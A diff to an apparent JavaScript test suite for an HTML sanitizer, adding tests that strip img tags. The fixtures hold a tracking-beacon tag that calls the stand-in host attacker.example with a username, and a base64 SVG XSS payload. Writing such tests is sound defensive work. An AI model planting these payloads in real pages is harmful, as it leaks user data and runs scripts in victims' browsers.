@@ -105,9 +105,18 @@ describe("sanitizeHtml", () => {
     expect(clean).not.toContain("inset-0");
   });
 
-  it("strips data: URI on img.src", () => {
+  it("strips <img> tag entirely — closes cross-origin tracking-beacon vector", () => {
+    const dirty = '<p>note</p><img src="https://attacker.example/beacon.gif?u=admin">';
+    const clean = sanitizeHtml(dirty);
+    expect(clean).not.toContain("<img");
+    expect(clean).not.toContain("attacker.example");
+    expect(clean).toContain("<p>note</p>");
+  });
+
+  it("strips <img> with data: URI (SVG XSS variant)", () => {
     const dirty = '<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">';
     const clean = sanitizeHtml(dirty);
+    expect(clean).not.toContain("<img");
     expect(clean).not.toMatch(/src=["']?data:/i);
   });
 });
